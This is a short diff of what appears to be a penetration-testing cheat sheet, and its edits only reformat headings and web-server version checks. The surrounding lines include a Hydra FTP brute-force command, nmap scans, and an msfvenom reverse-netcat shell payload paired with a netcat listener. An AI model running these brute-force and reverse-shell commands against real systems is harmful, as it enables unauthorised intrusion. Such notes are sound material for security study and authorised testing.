@@ -15,7 +15,7 @@ OR
 -Hydra -L /home/username.txt –P /home/password.txt ftp://IP -v
 #mercury services
 nmap -sV -p 25,80,110,143 subnet
-#CMS
+# CMS  
 nmap -p 80 --script http-enum targetwebsite.com
 and whatcms.org
 #SSH and Telnet Enumeration
@@ -38,10 +38,9 @@ cat file.txt            # Read
   and the type HEAD / HTTP/1.1
                Host: example.com
 -nmap -sV example.com -p 80,443
--
-
-
--telnet 192.168.0.1
+#Webserver version
+curl -I https://example.com
+nmap -sV -p 80,443 example.com
 -msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444 
 start listen nc -lnvp 444
 nc <ip> 22
